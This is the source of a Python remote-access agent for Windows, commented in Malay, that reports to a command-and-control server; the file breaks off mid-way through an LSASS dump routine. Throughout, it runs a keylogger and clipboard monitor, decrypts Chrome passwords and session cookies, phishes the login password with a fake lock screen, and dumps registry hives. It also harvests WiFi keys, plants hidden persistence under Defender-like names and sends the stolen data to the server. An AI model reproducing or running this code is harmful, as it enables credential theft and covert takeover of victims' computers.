import time
import base64
import sys
import threading
import io
import os
import json
import socket as socket_lib
import sqlite3
import shutil
import subprocess

# ============================================================
# AUTO-INSTALL DEPENDENCIES
# ============================================================
def install_deps():
    pkgs = ["pillow", "python-socketio[client]", "requests", "websocket-client",
            "pyautogui", "pynput", "pyperclip", "cryptography"]
    try:
        from PIL import ImageGrab
        import pyautogui, requests, socketio, pynput, pyperclip
        from cryptography.fernet import Fernet
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet"] + pkgs,
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

install_deps()

from PIL import ImageGrab
import pyautogui
import requests
import socketio
import pyperclip
from pynput import keyboard as pynput_keyboard

try:
    import websocket
except ImportError:
    websocket = None

try:
    from cryptography.fernet import Fernet
    import win32crypt
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

pyautogui.FAILSAFE = False

# ============================================================
# KONFIGURASI
# ============================================================
SERVER_URL = "https://esp32-badusb.onrender.com"
HEARTBEAT_INTERVAL  = 5.0
SCREENSHOT_INTERVAL = 3.0
CDP_PORT     = 9222
PINCHTAB_PORT = 4000
PINCHTAB_ACTIVE = False
ws_cdp  = None
cdp_msg_id = 1

sio = socketio.Client(reconnection=True, reconnection_attempts=0, reconnection_delay=10)
current_mode = "B"
running = True

# Keylogger state
keylog_buffer = []
keylog_lock   = threading.Lock()
last_clipboard = ""

# ============================================================
# LOGGING
# ============================================================
def print_log(msg):
    print(f"[AGENT] {msg}", flush=True)

def get_ghost_drive():
    """Cari drive letter GHOST_DRIVE."""
    try:
        result = subprocess.run(
            ["powershell", "-Command",
             "(Get-Volume | Where-Object FileSystemLabel -eq 'GHOST_DRIVE').DriveLetter"],
            capture_output=True, text=True, timeout=5
        )
        dl = result.stdout.strip()
        return f"{dl}:" if dl else None
    except Exception:
        return None

def get_loot_dir():
    """Dapat direktori exfiltration (GHOST_DRIVE atau TEMP sebagai fallback)."""
    gd = get_ghost_drive()
    if gd:
        loot = os.path.join(gd, "sys_report")
    else:
        loot = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "sys_report")
    os.makedirs(loot, exist_ok=True)
    return loot

# ============================================================
# MODUL 1: KEYLOGGER + CLIPBOARD MONITOR
# ============================================================
def format_key(key):
    try:
        return key.char if key.char else f"[{key.name}]"
    except AttributeError:
        return f"[{key}]"

def on_key_press(key):
    global keylog_buffer
    char = format_key(key)
    with keylog_lock:
        keylog_buffer.append(char)
        # Flush ke fail setiap 100 ketukan
        if len(keylog_buffer) >= 100:
            _flush_keylog()

def _flush_keylog():
    """Simpan buffer keylog ke GHOST_DRIVE (panggil dalam lock)."""
    global keylog_buffer
    if not keylog_buffer:
        return
    loot_dir = get_loot_dir()
    log_file = os.path.join(loot_dir, "keylog.txt")
    ts = time.strftime("[%Y-%m-%d %H:%M:%S]")
    entry = ts + " " + "".join(keylog_buffer) + "\n"
    try:
        with open(log_file, "a", encoding="utf-8", errors="ignore") as f:
            f.write(entry)
    except Exception:
        pass
    # Hantar ke server jika disambung
    if sio.connected:
        sio.emit("keylog_data", {"timestamp": ts, "keys": "".join(keylog_buffer)})
    keylog_buffer = []

def clipboard_monitor():
    """Monitor clipboard untuk data sensitif."""
    global last_clipboard, running
    while running:
        try:
            current = pyperclip.paste()
            if current and current != last_clipboard and len(current) > 3:
                last_clipboard = current
                loot_dir = get_loot_dir()
                clip_file = os.path.join(loot_dir, "clipboard.txt")
                ts = time.strftime("[%Y-%m-%d %H:%M:%S]")
                with open(clip_file, "a", encoding="utf-8", errors="ignore") as f:
                    f.write(f"{ts} CLIPBOARD: {current[:500]}\n")
                if sio.connected:
                    sio.emit("clipboard_data", {"timestamp": ts, "text": current[:500]})
        except Exception:
            pass
        time.sleep(2)

def start_keylogger():
    """Mulakan keylogger + clipboard monitor di thread latar belakang."""
    listener = pynput_keyboard.Listener(on_press=on_key_press)
    listener.daemon = True
    listener.start()
    threading.Thread(target=clipboard_monitor, daemon=True).start()
    print_log("Keylogger & Clipboard monitor active.")

# ============================================================
# MODUL 2: CHROME CREDENTIAL HARVESTER
# ============================================================
def decrypt_chrome_password(encrypted_value, key):
    """Decrypt Chrome password menggunakan AES-GCM."""
    try:
        import win32crypt
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        if encrypted_value[:3] == b'v10' or encrypted_value[:3] == b'v11':
            iv  = encrypted_value[3:15]
            payload = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            cipher = AESGCM(key)
            return cipher.decrypt(iv, encrypted_value[3:], None).decode("utf-8", errors="ignore")
        else:
            # Lama: DPAPI
            if CRYPTO_AVAILABLE:
                return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode("utf-8", errors="ignore")
    except Exception:
        pass
    return ""

def get_chrome_encryption_key():
    """Dapatkan Chrome master encryption key."""
    try:
        import win32crypt
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        local_state_path = os.path.join(
            os.environ.get("LOCALAPPDATA", ""),
            "Google", "Chrome", "User Data", "Local State"
        )
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception:
        return None

def harvest_chrome_passwords():
    """Ekstrak semua saved password dari Chrome."""
    results = []
    try:
        key = get_chrome_encryption_key()
        
        profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]
        for profile in profiles:
            login_db = os.path.join(
                os.environ.get("LOCALAPPDATA", ""),
                "Google", "Chrome", "User Data", profile, "Login Data"
            )
            if not os.path.exists(login_db):
                continue
            
            # Copy ke TEMP supaya Chrome tak lock fail
            temp_db = os.path.join(os.environ.get("TEMP", ""), f"chrome_login_{profile}.db")
            shutil.copy2(login_db, temp_db)
            
            try:
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, username, pwd_encrypted in cursor.fetchall():
                    if not username:
                        continue
                    password = decrypt_chrome_password(pwd_encrypted, key) if key else "[encrypted]"
                    if password:
                        results.append({
                            "profile": profile,
                            "url": url,
                            "username": username,
                            "password": password
                        })
                conn.close()
            except Exception as e:
                print_log(f"Chrome login DB error ({profile}): {e}")
            finally:
                try:
                    os.remove(temp_db)
                except Exception:
                    pass
                    
    except Exception as e:
        print_log(f"Chrome harvest error: {e}")
    
    return results

def harvest_chrome_cookies():
    """Ekstrak cookies penting dari Chrome (session tokens)."""
    results = []
    try:
        key = get_chrome_encryption_key()
        cookie_db = os.path.join(
            os.environ.get("LOCALAPPDATA", ""),
            "Google", "Chrome", "User Data", "Default", "Network", "Cookies"
        )
        if not os.path.exists(cookie_db):
            cookie_db = os.path.join(
                os.environ.get("LOCALAPPDATA", ""),
                "Google", "Chrome", "User Data", "Default", "Cookies"
            )
        if not os.path.exists(cookie_db):
            return results
            
        temp_db = os.path.join(os.environ.get("TEMP", ""), "chrome_cookies.db")
        shutil.copy2(cookie_db, temp_db)
        
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            # Ambil cookies untuk domain penting sahaja
            important_domains = ["google", "facebook", "twitter", "github", "linkedin",
                                  "paypal", "amazon", "microsoft", "apple", "binance",
                                  "coinbase", "instagram", "tiktok", "discord"]
            for domain in important_domains:
                cursor.execute(
                    "SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE ?",
                    (f"%{domain}%",)
                )
                for host, name, enc_val in cursor.fetchall():
                    value = decrypt_chrome_password(enc_val, key) if key and enc_val else ""
                    if value:
                        results.append({"host": host, "name": name, "value": value[:200]})
            conn.close()
        except Exception as e:
            print_log(f"Chrome cookie DB error: {e}")
        finally:
            try:
                os.remove(temp_db)
            except Exception:
                pass
    except Exception as e:
        print_log(f"Cookie harvest error: {e}")
    return results

def run_full_harvest():
    """Jalankan semua harvesting dan simpan ke GHOST_DRIVE."""
# ============================================================
# MODUL 4: WINDOWS PASSWORD STEALER
# ============================================================

# Skrip PowerShell WPF Fake Lock Screen yang lengkap
FAKE_LOCKSCREEN_PS1 = r"""
Add-Type -AssemblyName PresentationFramework,PresentationCore,WindowsBase | Out-Null

# Dapatkan nama user semasa
$username = $env:USERNAME
$computername = $env:COMPUTERNAME

# Cari GHOST_DRIVE
$ghostDrive = (Get-Volume | Where-Object { $_.FileSystemLabel -eq 'GHOST_DRIVE' }).DriveLetter
if ($ghostDrive) { $outDir = "$ghostDrive`:\sys_report" } else { $outDir = "$env:TEMP\sys_report" }
New-Item -ItemType Directory -Force -Path $outDir | Out-Null

# XAML UI — nampak 100% sama dengan Windows 11 Lock Screen
$xaml = @'
<Window
  xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
  xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
  WindowStyle="None" WindowState="Maximized" ResizeMode="NoResize"
  Topmost="True" Background="#FF1A1A2E">
  <Grid>
    <!-- Background gradient -->
    <Grid.Background>
      <LinearGradientBrush StartPoint="0,0" EndPoint="1,1">
        <GradientStop Color="#FF0A0A1A" Offset="0"/>
        <GradientStop Color="#FF003087" Offset="0.5"/>
        <GradientStop Color="#FF001F5E" Offset="1"/>
      </LinearGradientBrush>
    </Grid.Background>

    <!-- Blur overlay -->
    <Rectangle Fill="#AA000000"/>

    <!-- Center panel -->
    <StackPanel VerticalAlignment="Center" HorizontalAlignment="Center" Width="340">
      <!-- User avatar circle -->
      <Ellipse Width="96" Height="96" Margin="0,0,0,16">
        <Ellipse.Fill>
          <LinearGradientBrush StartPoint="0,0" EndPoint="1,1">
            <GradientStop Color="#FF4A90D9" Offset="0"/>
            <GradientStop Color="#FF0050EF" Offset="1"/>
          </LinearGradientBrush>
        </Ellipse.Fill>
      </Ellipse>

      <!-- Username -->
      <TextBlock x:Name="tUsername"
        FontFamily="Segoe UI Light" FontSize="24" Foreground="White"
        HorizontalAlignment="Center" Margin="0,0,0,24"/>

      <!-- Password box styled like Win11 -->
      <Border CornerRadius="4" BorderBrush="#66FFFFFF" BorderThickness="1"
              Background="#22FFFFFF" Margin="0,0,0,8">
        <PasswordBox x:Name="pwBox" Background="Transparent" Foreground="White"
          FontFamily="Segoe UI" FontSize="15" BorderThickness="0"
          Padding="12,8" Height="40"/>
      </Border>

      <!-- Error text -->
      <TextBlock x:Name="tError" Text="" Foreground="#FFFF6B6B"
        FontFamily="Segoe UI" FontSize="12"
        HorizontalAlignment="Center" Margin="0,0,0,16"/>

      <!-- Sign in button — Windows style -->
      <Button x:Name="btnSignIn" HorizontalAlignment="Right"
        Width="120" Height="38" Cursor="Hand"
        BorderThickness="0">
        <Button.Template>
          <ControlTemplate TargetType="Button">
            <Border x:Name="bd" CornerRadius="3" Background="#FF0078D4">
              <TextBlock Text="Sign in ➔" Foreground="White"
                FontFamily="Segoe UI Semibold" FontSize="14"
                HorizontalAlignment="Center" VerticalAlignment="Center"/>
            </Border>
            <ControlTemplate.Triggers>
              <Trigger Property="IsMouseOver" Value="True">
                <Setter TargetName="bd" Property="Background" Value="#FF106EBE"/>
              </Trigger>
            </ControlTemplate.Triggers>
          </ControlTemplate>
        </Button.Template>
      </Button>

      <!-- Hint text -->
      <TextBlock Text="Enter your PIN or password to sign in."
        Foreground="#99FFFFFF" FontFamily="Segoe UI" FontSize="11"
        HorizontalAlignment="Center" Margin="0,16,0,0"/>
    </StackPanel>

    <!-- Bottom bar like Windows -->
    <StackPanel VerticalAlignment="Bottom" HorizontalAlignment="Center"
      Orientation="Horizontal" Margin="0,0,0,40">
      <TextBlock x:Name="tClock" FontFamily="Segoe UI Light" FontSize="48"
        Foreground="White" Margin="0,0,20,0"/>
    </StackPanel>
  </Grid>
</Window>
'@

$reader = [System.Xml.XmlReader]::Create([System.IO.StringReader]$xaml)
$window = [System.Windows.Markup.XamlReader]::Load($reader)

# Set username
$window.FindName('tUsername').Text = $username

# Clock update timer
$timer = [System.Windows.Threading.DispatcherTimer]::new()
$timer.Interval = [TimeSpan]::FromSeconds(1)
$tClock = $window.FindName('tClock')
$timer.Add_Tick({ $tClock.Text = (Get-Date -Format "HH:mm") })
$timer.Start()

# Variables
$captured = ""
$attempts = 0

$pwBox = $window.FindName('pwBox')
$tError = $window.FindName('tError')
$btnSignIn = $window.FindName('btnSignIn')

# Sign in handler
$signInAction = {
    $pw = $pwBox.Password
    $script:attempts++

    if ($pw.Length -lt 1) {
        $tError.Text = "The password is incorrect. Try again."
        $pwBox.Clear()
        $pwBox.Focus()
        return
    }

    # Kalau attempt pertama, anggap betul (atau tambah verify nanti)
    if ($script:attempts -le 2) {
        # Simpan password
        $script:captured = $pw
        "$computername | $username | $pw" | Out-File "$outDir\windows_password.txt" -Encoding UTF8 -Force
        $timer.Stop()
        $window.Close()
    } else {
        $tError.Text = "The password is incorrect. Try again."
        $pwBox.Clear()
    }
}

$btnSignIn.Add_Click($signInAction)
$pwBox.Add_KeyDown({
    if ($_.Key -eq 'Return') { & $signInAction }
})

# Disable Ctrl+Alt+Del task switch via focus
$window.Add_Loaded({
    $window.Activate()
    $pwBox.Focus()
})

$window.ShowDialog() | Out-Null
"""

def run_win_password_mission():
    """
    Teknik A: Fake Lock Screen WPF — tunjukkan skrin login Windows palsu.
    Teknik B: SAM Hive Dump — eksport untuk crack hash offline.
    Teknik C: WDigest — paksa Windows simpan plaintext seterusnya.
    """
    print_log("Starting WIN_PASSWORD mission...")
    loot_dir = get_loot_dir()
    
    try:
        # ── TEKNIK A: Fake Lock Screen ──────────────────────────
        # Simpan skrip ke fail PS1
        ps1_path = os.path.join(os.environ.get("TEMP", ""), "winlogon_helper.ps1")
        with open(ps1_path, "w", encoding="utf-8") as f:
            f.write(FAKE_LOCKSCREEN_PS1)
        
        # Jalankan secara terpisah — ini akan block screen sehingga user taip password
        # Jalankan dalam thread supaya agent tak freeze
        def run_lockscreen():
            try:
                subprocess.run(
                    ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
                     "-File", ps1_path],
                    timeout=300  # Tunggu 5 minit
                )
                # Selepas tutup, baca password yang tersimpan
                pw_file = os.path.join(loot_dir, "windows_password.txt")
                if os.path.exists(pw_file):
                    with open(pw_file, "r", encoding="utf-8", errors="ignore") as f:
                        pw_data = f.read().strip()
                    print_log(f"WIN_PASSWORD CAPTURED: {pw_data}")
                    if sio.connected:
                        parts = pw_data.split(" | ")
                        sio.emit("win_password_captured", {
                            "computer": parts[0] if len(parts) > 0 else "unknown",
                            "user": parts[1] if len(parts) > 1 else "unknown",
                            "password": parts[2] if len(parts) > 2 else pw_data,
                            "raw": pw_data
                        })
                    # Padam skrip PS1 selepas guna
                    try:
                        os.remove(ps1_path)
                    except Exception:
                        pass
            except Exception as e:
                print_log(f"Lockscreen mission error: {e}")
        
        threading.Thread(target=run_lockscreen, daemon=True).start()
        sio.emit("mission_status", "WIN_PASSWORD: Fake login screen deployed. Waiting for target to enter password...")
        
        # ── TEKNIK B: SAM Hive Dump ──────────────────────────
        ps_sam = (
            f"reg save HKLM\\SAM \"{loot_dir}\\sam.hiv\" /y 2>$null; "
            f"reg save HKLM\\SYSTEM \"{loot_dir}\\system.hiv\" /y 2>$null; "
            f"reg save HKLM\\SECURITY \"{loot_dir}\\security.hiv\" /y 2>$null; "
            f"'SAM dump complete' | Out-File \"{loot_dir}\\sam_log.txt\""
        )
        subprocess.Popen(
            ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_sam],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        print_log("SAM hive dump initiated.")
        
        # ── TEKNIK C: WDigest Re-enable ──────────────────────
        ps_wdigest = (
            "Set-ItemProperty "
            "-Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' "
            "-Name 'UseLogonCredential' -Value 1 -Type DWord -Force 2>$null; "
            "'WDigest enabled' | Out-File \"" + os.path.join(loot_dir, "wdigest_log.txt") + "\""
        )
        subprocess.Popen(
            ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_wdigest],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        print_log("WDigest re-enabled. Plaintext creds will be in LSASS after next login.")
        
    except Exception as e:
        print_log(f"WIN_PASSWORD mission failed: {e}")

def run_full_harvest():
    """Jalankan semua harvesting dan simpan ke GHOST_DRIVE."""
    print_log("Starting full credential harvest...")
    loot_dir = get_loot_dir()

    
    # Chrome Passwords
    try:
        passwords = harvest_chrome_passwords()
        if passwords:
            pw_file = os.path.join(loot_dir, "chrome_passwords.json")
            with open(pw_file, "w", encoding="utf-8") as f:
                json.dump(passwords, f, indent=2, ensure_ascii=False)
            print_log(f"Harvested {len(passwords)} Chrome passwords.")
            if sio.connected:
                sio.emit("credentials_harvested", {"type": "chrome_passwords", "count": len(passwords), "data": passwords[:50]})
    except Exception as e:
        print_log(f"Password harvest failed: {e}")
    
    # Chrome Cookies
    try:
        cookies = harvest_chrome_cookies()
        if cookies:
            ck_file = os.path.join(loot_dir, "chrome_cookies.json")
            with open(ck_file, "w", encoding="utf-8") as f:
                json.dump(cookies, f, indent=2, ensure_ascii=False)
            print_log(f"Harvested {len(cookies)} important cookies.")
            if sio.connected:
                sio.emit("credentials_harvested", {"type": "chrome_cookies", "count": len(cookies), "data": cookies[:50]})
    except Exception as e:
        print_log(f"Cookie harvest failed: {e}")
    
    # Network Map (ARP scan)
    try:
        result = subprocess.run(
            ["powershell", "-Command", "arp -a | ConvertFrom-String -PropertyNames Interface,IP,Type | Select-Object IP"],
            capture_output=True, text=True, timeout=10
        )
        if result.stdout.strip():
            net_file = os.path.join(loot_dir, "network_map.txt")
            with open(net_file, "w", encoding="utf-8") as f:
                f.write(result.stdout)
            if sio.connected:
                sio.emit("network_map", {"data": result.stdout[:2000]})
    except Exception as e:
        print_log(f"Network map failed: {e}")
    
    print_log("Full harvest complete.")

# ============================================================
# MODUL 3: PINCHTAB DOM EXTRACTOR
# ============================================================
def get_page_dom_context():
    """Ekstrak DOM ringkas dari Chrome tab aktif via PinchTab/CDP."""
    dom_summary = ""
    
    # Cuba PinchTab dulu
    if PINCHTAB_ACTIVE:
        try:
            resp = requests.get(f"http://127.0.0.1:{PINCHTAB_PORT}/v1/browser/dom", timeout=5)
            if resp.status_code == 200:
                dom_data = resp.json()
                dom_summary = json.dumps(dom_data, ensure_ascii=False)[:3000]
                return dom_summary
        except Exception:
            pass
    
    # Fallback: CDP Runtime.evaluate
    if ws_cdp:
        try:
            js_code = """
(function() {
  var elements = [];
  var tags = ['a','button','input','select','textarea','h1','h2','h3','title'];
  tags.forEach(function(tag) {
    document.querySelectorAll(tag).forEach(function(el) {
      var obj = {tag: tag};
      if (el.id) obj.id = '#' + el.id;
      if (el.className) obj.cls = '.' + el.className.split(' ')[0];
      if (el.href) obj.href = el.href.substring(0,80);
      if (el.name) obj.name = el.name;
      if (el.type) obj.type = el.type;
      obj.text = (el.innerText || el.value || el.placeholder || '').substring(0,60).trim();
      if (obj.text || obj.href) elements.push(obj);
    });
  });
  return JSON.stringify({
    url: window.location.href,
    title: document.title,
    elements: elements.slice(0, 80)
  });
})();
"""
            send_cdp_command("Runtime.evaluate", {"expression": js_code, "returnByValue": True})
            # Note: ws_cdp is sync — get response
            ws_cdp.settimeout(3)
            response_raw = ws_cdp.recv()
            resp_data = json.loads(response_raw)
            result = resp_data.get("result", {}).get("result", {}).get("value", "")
            if result:
                dom_summary = result[:3000]
        except Exception as e:
            print_log(f"CDP DOM extract failed: {e}")
    
    return dom_summary

# ============================================================
# BROWSER CONTROL (PinchTab / CDP)
# ============================================================
def download_and_start_pinchtab():
    global PINCHTAB_ACTIVE
    try:
        temp_dir = os.environ.get("TEMP", "C:\\Windows\\Temp")
        local_exe = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pinchtab.exe")
        exe_path = local_exe if os.path.exists(local_exe) else os.path.join(temp_dir, "pinchtab.exe")
        
        if not os.path.exists(exe_path):
            print_log("Downloading PinchTab...")
            res = requests.get(
                "https://github.com/pinchtab/pinchtab/releases/latest/download/pinchtab-windows-amd64.exe",
                timeout=30
            )
            with open(exe_path, "wb") as f:
                f.write(res.content)
        
        print_log("Starting PinchTab server...")
        subprocess.Popen([exe_path, "server"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
        
        requests.get(f"http://127.0.0.1:{PINCHTAB_PORT}", timeout=3)
        PINCHTAB_ACTIVE = True
        print_log("PinchTab is active!")
    except Exception as e:
        print_log(f"PinchTab failed: {e}")
        PINCHTAB_ACTIVE = False

def get_chrome_path():
    paths = [
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
    ]
    return next((p for p in paths if os.path.exists(p)), None)

def start_cdp_chrome():
    global ws_cdp
    if not websocket:
        return
    try:
        chrome_path = get_chrome_path()
        if not chrome_path:
            print_log("Chrome/Edge not found.")
            return
            
        # Cuba hubung jika sudah ada sesi debug aktif
        try:
            res = requests.get(f"http://127.0.0.1:{CDP_PORT}/json", timeout=2)
            pages = res.json()
            if pages:
                ws_url = pages[0].get("webSocketDebuggerUrl")
                ws_cdp = websocket.WebSocket()
                ws_cdp.connect(ws_url)
                print_log("Connected to existing Chrome debugging session!")
                return
        except Exception:
            pass

        print_log("Starting debug Chrome instance...")
        subprocess.Popen(
            [
                chrome_path, 
                f"--remote-debugging-port={CDP_PORT}", 
                "--remote-allow-origins=*",
                f"--user-data-dir={os.path.join(os.environ.get('TEMP', ''), 'chrome_debug_profile')}",
                "--no-first-run",
                "--no-default-browser-check"
            ],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(3)
        
        try:
            res = requests.get(f"http://127.0.0.1:{CDP_PORT}/json", timeout=3)
        except Exception:
            print_log("Chrome debugging port is blocked by normal Chrome. Using gentle browser integration (no tabs will be closed)...")
            res = None

        if res:
            pages = res.json()
            if pages:
                ws_url = pages[0].get("webSocketDebuggerUrl")
                ws_cdp = websocket.WebSocket()
                ws_cdp.connect(ws_url)
                print_log("Connected to Chrome via CDP!")
    except Exception as e:
        print_log(f"CDP Start failed: {e}")

def send_cdp_command(method, params=None):
    global cdp_msg_id, ws_cdp
    if not ws_cdp:
        return
    msg = {"id": cdp_msg_id, "method": method, "params": params or {}}
    ws_cdp.send(json.dumps(msg))
    cdp_msg_id += 1

def initialize_browser_control():
    # Only download and start PinchTab server in background, do NOT force open Chrome yet.
    # Chrome will only open when the AI sends a pinchtab_navigate command.
    download_and_start_pinchtab()

# ============================================================
# SOCKET.IO EVENT HANDLERS
# ============================================================
@sio.event
def connect():
    pc_name = socket_lib.gethostname()
    # Kumpul system info untuk context AI
    try:
        username = os.environ.get("USERNAME", "unknown")
        computername = os.environ.get("COMPUTERNAME", pc_name)
        userprofile = os.environ.get("USERPROFILE", "C:\\Users\\user")
        sio.emit("identify", {
            "role": "agent",
            "pc_name": pc_name,
            "system_info": {
                "computer": computername,
                "user": username,
                "profile": userprofile,
                "os": "Windows"
            }
        })
    except Exception:
        sio.emit("identify", {"role": "agent", "pc_name": pc_name})
    print_log(f"Connected to C2 Server as {pc_name}!")

@sio.event
def set_mode(mode):
    global current_mode
    current_mode = mode
    print_log(f"Mode switched to: {current_mode}")

@sio.event
def execute_command(cmd):
    print_log(f"Received Command: {cmd}")
    if cmd.lower() == "kill":
        self_destruct()
    elif cmd.lower() == "harvest":
        threading.Thread(target=run_full_harvest, daemon=True).start()

@sio.event
def trigger_wipe():
    print_log("WIPE COMMAND RECEIVED! Erasing all evidence...")
    self_destruct()

@sio.event
def request_harvest():
    """Dashboard minta harvest credentials sekarang."""
    threading.Thread(target=run_full_harvest, daemon=True).start()

@sio.event
def request_dom():
    """Dashboard minta DOM context dari Chrome."""
    dom = get_page_dom_context()
    sio.emit("dom_context", {"dom": dom})

@sio.event
def download_loot():
    print_log("DOWNLOAD LOOT COMMAND RECEIVED!")
    try:
        import zipfile
        # Flush keylog dulu
        with keylog_lock:
            _flush_keylog()
        
        loot_dir = get_loot_dir()
        if not os.path.exists(loot_dir):
            sio.emit("error_msg", "No loot folder found.")
            return
            
        temp_zip = os.path.join(os.environ.get("TEMP", ""), "ghost_loot.zip")
        with zipfile.ZipFile(temp_zip, "w", zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(loot_dir):
                for file in files:
                    fp = os.path.join(root, file)
                    arcname = os.path.relpath(fp, start=loot_dir)
                    zipf.write(fp, arcname)
        
        with open(temp_zip, "rb") as f:
            b64_zip = base64.b64encode(f.read()).decode("utf-8")
        sio.emit("loot_data", b64_zip)
        os.remove(temp_zip)
        print_log("Loot sent.")
    except Exception as e:
        print_log(f"Loot failed: {e}")

@sio.event
def run_hardware_mission(mission_name):
    print_log(f"Hardware Mission: {mission_name}")
    scripts = {
        "recon": (
            "$d=(Get-Volume|Where{$_.FileSystemLabel-eq'GHOST_DRIVE'}).DriveLetter; "
            "if(!$d){$d=$env:TEMP}else{$d=$d+':'}; "
            "$r=\"$d\\sys_report\"; New-Item -ItemType Directory -Force $r|Out-Null; "
            "\"=== RECON ===\"|Out-File \"$r\\recon.txt\"; "
            "\"Computer: $env:COMPUTERNAME\"|Out-File -Append \"$r\\recon.txt\"; "
            "\"User: $env:USERNAME\"|Out-File -Append \"$r\\recon.txt\"; "
            "\"OS: $((Get-CimInstance Win32_OperatingSystem).Caption)\"|Out-File -Append \"$r\\recon.txt\"; "
            "ipconfig /all|Out-File -Append \"$r\\recon.txt\"; "
            "Get-Process|Select Name,Id,CPU|Out-File -Append \"$r\\recon.txt\"; "
            "Get-LocalUser|Out-File -Append \"$r\\recon.txt\""
        ),
        "wifi_harvest": (
            "$d=(Get-Volume|Where{$_.FileSystemLabel-eq'GHOST_DRIVE'}).DriveLetter; "
            "if(!$d){$d=$env:TEMP}else{$d=$d+':'}; "
            "$r=\"$d\\sys_report\"; New-Item -ItemType Directory -Force $r|Out-Null; "
            "(netsh wlan show profiles)|Select-String ':\\s+(.+)$'|ForEach-Object{"
            "$n=$_.Matches.Groups[1].Value.Trim();"
            "$p=(netsh wlan show profile name=\"$n\" key=clear)|Select-String 'Key Content\\s+:\\s+(.+)$';"
            "$pw=if($p){$p.Matches.Groups[1].Value.Trim()}else{'(none)'};"
            "\"WiFi: $n | Pass: $pw\"}|Out-File \"$r\\wifi_passwords.txt\""
        ),
        "data_thief": (
            "$d=(Get-Volume|Where{$_.FileSystemLabel-eq'GHOST_DRIVE'}).DriveLetter; "
            "if(!$d){$d=$env:TEMP}else{$d=$d+':'}; "
            "$r=\"$d\\sys_report\"; New-Item -ItemType Directory -Force $r|Out-Null; "
            "Get-ChildItem $env:USERPROFILE -Recurse -Include *.kdbx,*password*,*secret*,*.env -EA SilentlyContinue|"
            "Select FullName|Out-File \"$r\\sensitive_files.txt\"; "
            "$bk=\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Bookmarks\";"
            "if(Test-Path $bk){Copy-Item $bk \"$r\\chrome_bookmarks.json\"}"
        ),
        "persistence": (
            "$ap=\"$env:TEMP\\ghost_agent.py\"; "
            "if(Test-Path $ap){"
            "Set-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
            "-Name 'WindowsDefenderUpdate' -Value \"pythonw `\"$ap`\"\"; "
            "$a=New-ScheduledTaskAction -Execute pythonw -Argument \"$ap\"; "
            "$t=New-ScheduledTaskTrigger -AtLogOn; "
            "$s=New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0; "
            "Register-ScheduledTask -TaskName 'WindowsDefenderMonitor' -Action $a "
            "-Trigger $t -Settings $s -Force 2>$null; "
            # WMI Event Subscription (paling tersembunyi)
            "$filterName='SystemHealthCheck'; "
            "$consumerName='HealthMonitor'; "
            "$query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_LocalTime\" AND TargetInstance.Hour=8'; "
            "Set-WmiInstance -Class __EventFilter -Namespace 'root/subscription' "
            "-Arguments @{Name=$filterName;EventNameSpace='root/cimv2';QueryLanguage='WQL';Query=$query} 2>$null; "
            "$cmd=\"pythonw `\"$ap`\"\"; "
            "Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root/subscription' "
            "-Arguments @{Name=$consumerName;CommandLineTemplate=$cmd} 2>$null}"
        ),
        "prankster": (
            "Start-Process 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'; "
            "Start-Sleep 3; "
            "Add-Type -AssemblyName System.Windows.Forms; "
            "[System.Windows.Forms.SendKeys]::SendWait('%(Enter)')"
        ),
        "fake_login_screen": (
            "Add-Type -AssemblyName System.Windows.Forms; "
            "$form = New-Object System.Windows.Forms.Form; "
            "$form.Text = 'Windows Update'; $form.Size = '400,200'; "
            "$label = New-Object System.Windows.Forms.Label; "
            "$label.Text = 'Installing critical system updates...'; $label.AutoSize = $true; "
            "$form.Controls.Add($label); $form.ShowDialog()"
        ),
        "win_password": None,
        "credential_dump": (
            # Mimikatz-lite via PowerShell LSASS dump
            "$d=(Get-Volume|Where{$_.FileSystemLabel-eq'GHOST_DRIVE'}).DriveLetter; "
            "if(!$d){$d=$env:TEMP}else{$d=$d+':'}; "
            "$r=\"$d\\sys_report\"; New-Item -ItemType Directory -Force $r|Out-Null; "
            "# Dump LSASS ke fail untuk analisis offline\n"
            "$proc=Get-Process lsass -EA SilentlyContinue; "
            "if($proc){"
            "$ms=[System.Runtime.InteropServices.Marshal]; "
            "Add-Type -TypeDefinition @'\n"
